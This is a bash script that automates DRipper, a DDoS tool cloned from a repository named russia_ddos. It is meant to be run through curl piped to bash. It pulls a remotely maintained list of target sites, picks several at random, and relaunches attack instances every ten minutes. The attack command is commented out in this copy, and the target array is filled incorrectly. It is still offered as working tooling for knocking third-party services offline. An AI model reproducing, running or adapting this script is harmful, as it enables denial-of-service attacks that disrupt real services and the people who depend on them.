#!/bin/bash
##### Use next command in local linux terminal to run this script. #####
# >>>     curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper.sh | bash    <<<

##### This script will read and update database target every 10 min (default)
##### https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/Dripper_targets

##### To kill script just close terminal window.
##### OR
##### Open other terminal and run 'pkill -f DRipper.py'. Then in terminal with this script press CTRL+C.


# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi

# How many copies of DRipper would be launched
# Low number is counter-productive because some sites might go down fast, so script won't do any work.
# Somewhere beetween 4 and 8 targets is good starting point.
# With high number of copies console output will be messy because all instances of DRipper use same terminal.
num_of_targets=8

# Restart DRipper.py every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m)
restart_time=600

while true
do
   # Download latest version of DDripper.
   cd ~
   rm -rf russia_ddos
   git clone https://github.com/alexmon1989/russia_ddos.git
   cd russia_ddos
   pip install -r requirements.txt
   
   # Number of targets in DRipper_targets
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
   echo "Number of targets in list: " $list_size

   # Get multiple random numbers to choose multiple targets from DRipper_targets
   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
   echo "random numbers: " $random_numbers

   #create empty array of targets
   targets=()
   
   # Launch several copies of DRipper.
   for i in $random_numbers
      do
             echo "array: "$targets
             # Get address, port and protocol from pre-selected targetle
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
             echo $site
             

             
             addr=$(echo $site | awk '{print $1}')
             port=$(echo $site | awk '{print $2}')
             prot=$(echo $site | awk '{print $3}')

             targets+=('$addr')

             # Launch DRipper
             #python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
      done
      # Restart DRipper_main after N seconds (default 600s = 10m)
      sleep $restart_time
      pkill -f DRipper.py
done
